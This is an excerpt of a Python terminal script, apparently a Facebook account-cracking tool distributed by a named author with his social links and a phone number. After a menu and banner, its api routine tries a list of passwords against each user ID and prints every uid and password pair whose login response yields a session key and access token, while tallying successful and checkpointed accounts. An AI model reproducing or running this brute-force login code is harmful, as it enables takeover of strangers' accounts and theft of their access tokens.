#THE TOOL CREATED BY 𝑭𝒂𝒊𝒔𝒂𝒍 𝑯𝒂𝒊𝒅𝒂𝒓𝒚
#BD Cyber Zone-BCZ
#FB : https://www.facebook.com/profile.php?id=100074211366139
#Programer 𝑭𝒂𝒊𝒔𝒂𝒍 𝑯𝒂𝒊𝒅𝒂𝒓𝒚
#𝐖𝐇𝐀𝐓'𝐒 𝐀𝐏𝐏 : +93706258089
W = '\033[97;1m' 
R = '\033[91;1m' 
G = '\033[92;1m' 
Y = '\033[93;1m' 
...
\33[1;32m𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲 𝐓𝐨𝐨𝐥𝐬

\33[1;34m✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨↦↦↦↦↦✨


╔════════════════════════════════════════╗
║\33[1;32m[↦] 𝙰𝚄𝚃𝙷𝙾𝚁       : 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲
║\33[1;32m[↦] 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺 : 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲
║\33[1;32m[↦] 𝙶𝙸𝚃𝙷𝚄𝙱      : 𝑭𝒂𝒊𝒔𝒂𝒉𝒂𝒊𝒅𝒂𝒓𝒚
║\33[1;32m[↦] 𝚆𝚑𝚊𝚝𝚜𝚊𝚙𝚙 : +93706258089
║\33[1;32m[↦] 𝚂𝚝𝚊𝚝𝚞𝚜       : 𝙵𝚛𝚎𝚎
║\33[1;32m[↦] 𝚃𝙴𝙰𝙼            : 𝑻𝑬𝑪𝑯 𝑻𝑬𝑨𝑴
...
class Main:
	def __init__(self):
		...
		if syed in ["", " "]:
			...
			os.system('xdg-open https://www.facebook.com/profile.php?id=100074211366139')
			print("")
			time.sleep(2.0)
			print("\033[1;33m   This Is 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲")
			print("")
			input("\n\033[1;32m   ENTER YOUR FACEBOOK  NAME  ==> \033[1;36m")
			time.sleep(2.1)
			print("")
			print("\033[1;32m  Successful Bro Please W8...")
			print("\033[1;32m  The Tool Created By 𝐅𝐚𝐢𝐬𝐚𝐥 𝐇𝐚𝐢𝐝𝐚𝐫𝐲")
			time.sleep(2.0)
			os.system("clear")
		print(logo)
		print("\033[0;90m╔══════════════════════════════════════════════════════════╗")
		...
		print(' \x1b[1;32m[4] \x1b[1;32mEnter my WhatsApp ')
		...
		if DEVIL in ["1", "01"]:
			self.fbtua()
		if DEVIL in ["2", "02"]:
			os.system('xdg-open https://github.com/Faisalhaidary')
		if DEVIL in ["3", "03"]:
			os.system('xdg-open https://www.facebook.com/profile.php?id=100074211366139/')
		if DEVIL in ["4", "04"]:
			os.system('xdg-openhttps://chat.whatsapp.com/Ia2YLnP0zqX4cYvoBNJ4UF//')
		if DEVIL in ["5",  "05"]:
			self.old2()
			exit()
		else:
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[92;1m[𝐅𝐚𝐢𝐬𝐚𝐥] : %s/%s -> \033[0;92m [ OK:%s ]- \033[0;91m[CP:%s ]"%(B,self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[1;32m   [𝐅𝐚𝐢𝐬𝐚𝐥] %s | %s\033[1;32m         "%(uid, pw))
